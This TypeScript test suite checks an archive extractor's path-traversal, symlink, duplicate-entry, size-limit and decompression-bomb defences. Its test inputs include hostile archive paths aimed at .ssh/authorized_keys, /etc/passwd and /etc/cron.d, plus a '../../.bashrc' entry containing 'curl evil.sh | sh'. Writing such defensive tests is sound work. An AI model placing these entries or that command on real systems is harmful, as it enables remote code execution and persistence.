import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { AgentSkillsError, ErrorCode, encodeText, type ArchiveEntry } from '@jvm-expert/core';
import { assertContained, inspectPath, isSafePath, safeRelativePath } from '../src/safe-path.ts';
import { SafeExtractor } from '../src/safe-extractor.ts';

const MANIFEST = `schemaVersion: 1
name: evil-skill
version: 1.0.0
description: A package used to exercise the extraction safety rules.
files:
  - SKILL.md
  - skill.yaml
`;

const SKILL_MD = `---
name: evil-skill
description: A package used to exercise the extraction safety rules.
---

# Evil skill

Body long enough to pass the minimum-content check in validation.
`;

function file(path: string, content = 'x'): ArchiveEntry {
  return { path, type: 'file', size: content.length, mode: 0o644, bytes: encodeText(content) };
}

function validPayload(prefix = ''): ArchiveEntry[] {
  return [file(`${prefix}SKILL.md`, SKILL_MD), file(`${prefix}skill.yaml`, MANIFEST)];
}

/** The extractor is driven directly with entries, so no real tar is needed for these rules. */
function extract(entries: readonly ArchiveEntry[], compressedBytes = 1024) {
  return new SafeExtractor({ read: async () => entries }).fromEntries(
    entries,
    'test://payload',
    compressedBytes,
  );
}

describe('path safety', () => {
  const hostile: [string, string][] = [
    ['../../.ssh/authorized_keys', 'traversal'],
    ['a/../../etc/passwd', 'traversal'],
    ['..\\..\\windows\\system32\\evil.dll', 'traversal'],
    ['/etc/passwd', 'absolute'],
    ['C:\\Windows\\System32\\evil.dll', 'driveLetter'],
    ['\\\\server\\share\\evil.dll', 'uncPath'],
    ['CON.md', 'reservedName'],
    ['nested/PRN.txt', 'reservedName'],
    ['com1', 'reservedName'],
    ['evil.txt.', 'trailingDotOrSpace'],
    ['evil.txt ', 'trailingDotOrSpace'],
    ['file:stream', 'alternateDataStream'],
    ['what?.md', 'illegalCharacter'],
    ['a<b>.md', 'illegalCharacter'],
    ['', 'empty'],
  ];

  for (const [path, rule] of hostile) {
    it(`rejects ${JSON.stringify(path)} as ${rule}`, () => {
      const reason = inspectPath(path);
      assert.ok(reason !== undefined, 'expected the path to be rejected');
      assert.equal(reason.rule, rule);
      assert.equal(isSafePath(path), false);
    });
  }

  it('rejects a path containing a NUL byte', () => {
    assert.equal(inspectPath(`evil${String.fromCharCode(0)}.md`)?.rule, 'controlChars');
  });

  it('rejects a path deeper than the segment limit', () => {
    assert.equal(inspectPath(`${'a/'.repeat(64)}b.md`)?.rule, 'tooDeep');
  });

  const safe = [
    'SKILL.md',
    'skill.yaml',
    'references/notes.md',
    'assets/img/logo.png',
    'a/b/c/d.md',
  ];
  for (const path of safe) {
    it(`accepts ${path}`, () => {
      assert.equal(inspectPath(path), undefined);
      assert.equal(safeRelativePath(path), path);
    });
  }

  it('normalises inner traversal that stays inside the root', () => {
    assert.equal(safeRelativePath('references/../SKILL.md'), 'SKILL.md');
  });

  it('throws with a security error code rather than sanitising silently', () => {
    assert.throws(
      () => safeRelativePath('../escape.md'),
      (error: unknown) => error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_PATH,
    );
  });

  describe('containment check', () => {
    it('accepts a path inside the root', () => {
      assert.doesNotThrow(() => assertContained('/root/dir', '/root/dir/a/b.md', '/'));
      assert.doesNotThrow(() => assertContained('/root/dir', '/root/dir', '/'));
    });

    it('rejects a sibling that merely shares a prefix', () => {
      assert.throws(
        () => assertContained('/root/dir', '/root/dir-evil/x.md', '/'),
        AgentSkillsError,
      );
    });

    it('rejects an escape', () => {
      assert.throws(() => assertContained('/root/dir', '/root/other/x.md', '/'), AgentSkillsError);
    });

    it('works with Windows separators', () => {
      assert.doesNotThrow(() => assertContained('C:\\root\\dir', 'C:\\root\\dir\\a.md', '\\'));
      assert.throws(
        () => assertContained('C:\\root\\dir', 'C:\\root\\evil\\a.md', '\\'),
        AgentSkillsError,
      );
    });
  });
});

describe('archive extraction safety', () => {
  it('extracts a well-formed package', () => {
    const pkg = extract(validPayload());
    assert.equal(pkg.manifest.name, 'evil-skill');
    assert.deepEqual(pkg.files.map((f) => f.path).sort(), ['SKILL.md', 'skill.yaml']);
  });

  it('strips a shared leading directory, as GitHub and npm tarballs have', () => {
    const pkg = extract(validPayload('evil-skill-1.0.0/'));
    assert.deepEqual(pkg.files.map((f) => f.path).sort(), ['SKILL.md', 'skill.yaml']);
  });

  it('does not strip when entries do not share one directory', () => {
    // A root-level SKILL.md means the `nested/` prefix is not a wrapper.
    const pkg = extract([...validPayload(), file('nested/extra.md', 'extra')]);
    assert.ok(pkg.files.some((f) => f.path === 'nested/extra.md'));
  });

  it('rejects a symlink outright', () => {
    assert.throws(
      () =>
        extract([
          ...validPayload(),
          {
            path: 'evil-link',
            type: 'symlink',
            size: 0,
            mode: 0o777,
            linkTarget: '/etc/passwd',
            bytes: new Uint8Array(),
          },
        ]),
      (error: unknown) =>
        error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_ARCHIVE,
    );
  });

  it('rejects a traversing entry even when the rest of the package is fine', () => {
    assert.throws(
      () => extract([...validPayload(), file('../../.bashrc', 'curl evil.sh | sh')]),
      (error: unknown) => error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_PATH,
    );
  });

  it('rejects an absolute entry', () => {
    assert.throws(
      () => extract([...validPayload(), file('/etc/cron.d/evil', 'x')]),
      (error: unknown) => error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_PATH,
    );
  });

  it('rejects duplicate entries, which could bypass an earlier check', () => {
    assert.throws(
      () => extract([...validPayload(), file('SKILL.md', 'second copy')]),
      (error: unknown) =>
        error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_ARCHIVE,
    );
  });

  it('rejects an implausible compression ratio', () => {
    const huge = 'a'.repeat(1_000_000);
    assert.throws(
      () => extract([...validPayload(), file('bomb.txt', huge)], 100),
      (error: unknown) => {
        assert.ok(error instanceof AgentSkillsError);
        assert.equal(error.code, ErrorCode.UNSAFE_ARCHIVE);
        assert.match(error.message, /decompression bomb/);
        return true;
      },
    );
  });

  it('rejects an archive over the file-count limit', () => {
    const extractor = new SafeExtractor(
      { read: async () => [] },
      {
        maxFiles: 3,
        maxTotalBytes: 1024 * 1024,
        maxCompressionRatio: 1000,
      },
    );
    const entries = [...validPayload(), file('a.md'), file('b.md'), file('c.md')];
    assert.throws(
      () => extractor.fromEntries(entries, 'test://payload', 1024),
      (error: unknown) =>
        error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_ARCHIVE,
    );
  });

  it('rejects an archive over the total-size limit', () => {
    const extractor = new SafeExtractor(
      { read: async () => [] },
      {
        maxFiles: 100,
        maxTotalBytes: 64,
        maxCompressionRatio: 100000,
      },
    );
    assert.throws(
      () =>
        extractor.fromEntries(
          [...validPayload(), file('big.md', 'x'.repeat(500))],
          'test://p',
          1024,
        ),
      (error: unknown) =>
        error instanceof AgentSkillsError && error.code === ErrorCode.UNSAFE_ARCHIVE,
    );
  });

  it('rejects an archive with no manifest', () => {
    assert.throws(
      () => extract([file('SKILL.md', SKILL_MD)]),
      (error: unknown) =>
        error instanceof AgentSkillsError && error.code === ErrorCode.INVALID_PACKAGE,
    );
  });

  it('ignores directory entries', () => {
    const pkg = extract([
      ...validPayload(),
      { path: 'references/', type: 'directory', size: 0, mode: 0o755, bytes: new Uint8Array() },
    ]);
    assert.equal(pkg.files.length, 2);
  });
});
